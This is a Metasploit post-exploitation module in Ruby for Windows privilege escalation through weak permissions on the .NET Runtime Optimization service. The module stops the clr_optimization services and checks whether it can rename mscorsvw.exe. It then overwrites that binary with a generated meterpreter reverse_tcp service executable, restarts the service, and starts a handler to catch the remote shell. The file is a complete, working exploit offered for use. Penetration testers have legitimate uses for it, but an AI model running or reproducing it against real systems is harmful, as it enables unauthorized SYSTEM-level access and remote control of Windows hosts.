##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Services

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Escalate Microsoft .NET Runtime Optimization Service Privilege Escalation',
      'Description'   => %q{
        This module attempts to exploit the security permissions set on the .NET Runtime
      Optimization service. Vulnerable versions of the .NET Framework include 4.0 and 2.0.
      The permissions on this service allow domain users and local power users to modify
      the mscorsvw.exe binary.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'bannedit' ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'References'    =>
        [
          [ 'OSVDB', '71013' ],
          [ 'EDB', '16940' ]
        ]
    ))

    register_options([
      OptAddress.new("LHOST", [ false, "Listener IP address for the new session" ]),
      OptPort.new("LPORT", [ false, "Listener port for the new session", 4444 ]),
    ])

  end

  def run
    paths = []
    services = []
    vuln = ""
    @temp = session.fs.file.expand_path("%TEMP%")

    if init_railgun() == :error
      return
    end

    print_status("Checking for vulnerable .NET Framework Optimization service")
    print_status("This may take a few minutes.")
    # enumerate the installed .NET versions
    service_list.each do |service|
      if service[:name] =~ /clr_optimization_.*/
        info = service_info(service[:name])
        paths << info['Command']
        services << service[:name]
        begin
          service_stop(service[:name]) # temporarily stop the service
          print_status("Found #{info['Name']} installed")
        rescue
          print_error("We do not appear to have access to stop #{info['Name']}")
        end
      else
        next
      end
    end

    paths.each do |image|
      if check_perms(image)
        vuln << image
        break
      end
    end

    if vuln.nil? or vuln.empty?
      print_error("Could not find any vulnerable .NET Framework Optimization services")
      return
    else
      payload = setup_exploit
    end

    services.each do |service|
      session.railgun.kernel32.CopyFileA(payload, vuln, false)
      mng = session.railgun.advapi32.OpenSCManagerA(nil,nil,1)
      if mng['return'].nil?
        print_error("Cannot open service manager, not enough privileges")
        return
      end
      # restart the service
      status = service_start(service)

      if status == 0
        print_status("Restarted #{service}")
      else
        print_error("Failed to restart #{service}")
      end
      return
    end
  end

  def check_perms(image)
    if image !~ /mscor/
      return
    end

    if !session.railgun.kernel32.MoveFileA(image, image + '.bak')['return']
      print_error("Found Secure Permissions on #{image}")
      return false
    else
      print_status("Found Weak Permissions on #{image}")
      print_status("Exploiting...")
      return true
    end
  end

  def init_railgun
    begin
    rg = session.railgun
    if (!rg.get_dll('advapi32'))
      rg.add_dll('advapi32')
    end
    rescue Exception => e
      print_error("Could not initalize railgun")
      print_error("Railgun Error: #{e}")
      return :error
    end
  end

  def setup_exploit
    lhost = datastore["LHOST"] || Rex::Socket.source_address
    lport = datastore["LPORT"] || 4444
    p_mod = datastore['PAYLOAD'] || "windows/meterpreter/reverse_tcp"
    file  = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"

    payload = session.framework.payloads.create(p_mod)
    payload.datastore['LHOST'] = lhost
    payload.datastore['LPORT'] = lport

    exe = Msf::Util::EXE.to_win32pe_service(session.framework, payload.generate)
    begin
      print_status("Uploading payload #{file} executable to temp directory")
      # Upload the payload to the filesystem
      file = @temp + "\\" + file
      fd = session.fs.file.new(file, "wb")
      print_status("Writing #{file}...")
      fd.write(exe)
      fd.close
    rescue Exception => e
      print_error("Error uploading file #{file}: #{e.class} #{e}")
      return
    end

    print_status("Setting up multi/handler...")
    print_status("Using Payload #{p_mod}...")
    handler = session.framework.exploits.create("multi/handler")
    handler.register_parent(self)
    handler.datastore['PAYLOAD'] = p_mod
    handler.datastore['LHOST']   = lhost
    handler.datastore['LPORT']   = lport
    handler.datastore['InitialAutoRunScript'] = "migrate -f"
    handler.datastore['ExitOnSession'] = true
    handler.datastore['ListenerTimeout'] = 300
    handler.datastore['ListenerComm'] = 'local'

    # handler.exploit_module = self
    handler.exploit_simple(
      'LocalInput'  => self.user_input,
      'LocalOutput' => self.user_output,
      'Payload'  => handler.datastore['PAYLOAD'],
      'RunAsJob' => true
    )

    print_status("Upload complete")
    return file
  end
end
